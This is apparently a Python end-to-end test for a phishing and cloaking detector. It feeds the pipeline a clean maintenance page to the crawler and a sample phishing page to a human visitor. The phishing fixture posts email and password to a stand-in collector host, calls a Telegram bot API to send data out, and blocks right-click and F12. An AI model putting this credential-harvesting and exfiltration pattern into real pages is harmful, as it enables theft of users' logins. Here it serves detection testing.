"""
test_pipeline_e2e.py — 真的跑 main.py 的 compiled LangGraph（不連網、不呼叫真 LLM）
執行: python test_pipeline_e2e.py

跟 test_node3/4 不同：這裡測的是「圖的接線」本身，不是手動照抄目前的正確
呼叫順序 —— 用 main.build_graph() 建圖、graph.invoke() 執行，這樣如果哪天
main.py 的 edge 被接錯（例如不小心恢復成條件路由、或某節點被接到錯的 llm
模組變數），這裡才會真的跑出不一樣的結果並讓斷言失敗。

llm_code / llm / llm_cloak 三個模組變數強制設 None：
  - node2 的測試 JS 沒有明顯混淆，obfuscation_score 不會觸發 LLM 呼叫
  - node3 的 D1/D3 布林規則在 LLM 呼叫之前就會裁決（釣魚案例）；
    正常站案例會落到 Layer 2，llm=None 觸發 AttributeError 但節點內有
    try/except 吞掉、llm_confidence 退回 0.0，結果仍然正確
  - node4 的靜態 LLM 呼叫同理，AttributeError 被吞、退回純 regex 判斷
  三者皆已在 test_node3_phishing.py / test_node4_static.py 個別驗證過
  這條降級路徑，這裡只是讓它們在「真圖」裡再跑一次。

把 dual_crawler.dual_crawl 換成假的爬取結果，驗證整條 graph：
  Node1 雙重爬取 → Node2 JS 分析 → Node3 判釣魚(HUMAN 頁) → Node4 比 cloaking → Node5 輸出
"""
import sys, os, csv
sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

import nodes.dual_crawler as dc
import nodes.node1_scraper as n1

CLEAN = "<html><body><h1>Under maintenance</h1><p>Please check back later.</p></body></html>"
PHISH = """
<html><body oncontextmenu="return false;">
<form action="https://collector-9x.duckdns.org/next.php" method="post">
  <input type="text" name="email"><input type="password" name="password">
</form>
<script>
document.getElementById('password').value;
document.querySelector('[type="password"]');
fetch('https://api.telegram.org/bot123456789:AAFvE7xxxxxxxxxxxxxxxxxxxxxxxxxxxxx/sendMessage?chat_id=1');
document.onkeydown = function(e){ if(e.keyCode === 123) return false; };
</script></body></html>
"""


def _result(html, text, **kw):
    r = {"html": html, "text_content": text, "html_length": len(html),
         "status_code": 200, "error": None, "title": "Sign in",
         "redirect_chain": ["https://x.example/login"], "final_url": "https://x.example/login",
         "response_headers": {}, "fetch_time_sec": 9.0,
         "prewarm_ok": True, "tls_fingerprint": "playwright_chromium", "proxy_used": False}
    r.update(kw)
    return r


def _stub(bot_html, human_html):
    def fake(url):
        return (_result(bot_html, "Under maintenance Please check back later."),
                _result(human_html, "Sign in Enter your credentials"), [])
    dc.dual_crawl = fake
    n1.dual_crawl = fake        # node1 以 from-import 綁定，要一起換


def _run(url, bot_html, human_html):
    """建真圖、跑真圖 —— 不手動排節點呼叫順序。"""
    _stub(bot_html, human_html)
    import main
    # 強制退化為純規則模式，避免測試連到真的 LLM API（見檔頭說明）。
    # build_graph() 內的 make_node(fn, llm=llm_code) 在呼叫當下才解析
    # 這幾個模組變數，所以先覆寫再建圖即可生效，不需要碰快取。
    main.llm_code  = None
    main.llm       = None
    main.llm_cloak = None
    graph = main.build_graph()
    return graph.invoke(main.create_initial_state(url))


def test_cloaked_phishing_end_to_end():
    """爬蟲看到乾淨頁、真人看到釣魚頁 —— 舊架構會完全漏掉這個案例"""
    s = _run("https://secure-login.duckdns.org/verify", CLEAN, PHISH)
    assert s["is_phishing"], "HUMAN 端是釣魚頁卻沒判出來"
    assert s["cloaking_verified"], f"未判定為 cloaking: {s['dual_crawl_results'].get('evidence')}"
    assert s["cloaking_confidence_tier"] in ("CONFIRMED", "SUSPECTED")
    assert "webhook_exfiltration" in s["dual_crawl_results"]["hidden_from_bot"]
    # raw_html 必須是 HUMAN 那份（判釣魚要看真人看到的頁面）
    assert "api.telegram.org" in s["raw_html"], "raw_html 不是 HUMAN 頁面"


def test_plain_site_end_to_end():
    s = _run("https://shop.example.com/", CLEAN, CLEAN)
    assert not s["is_phishing"], f"正常站誤報: {s['phishing_confidence']}"
    assert not s["cloaking_verified"]
    assert "是否為釣魚網站：否" in s["report"]


def test_csv_has_exactly_three_columns():
    from nodes.node5_risk_output import SESSION_CSV, FIELDNAMES
    assert FIELDNAMES == ["url", "is_phishing", "cloaking"], FIELDNAMES
    with open(SESSION_CSV, encoding="utf-8-sig") as f:
        rows = list(csv.DictReader(f))
    assert rows and list(rows[0]) == FIELDNAMES, list(rows[0]) if rows else "空 CSV"
    print(f"     CSV: {SESSION_CSV.name} / {len(rows)} 列")


if __name__ == "__main__":
    for fn in (test_cloaked_phishing_end_to_end, test_plain_site_end_to_end,
               test_csv_has_exactly_three_columns):
        fn()
        print(f"PASS  {fn.__name__}")
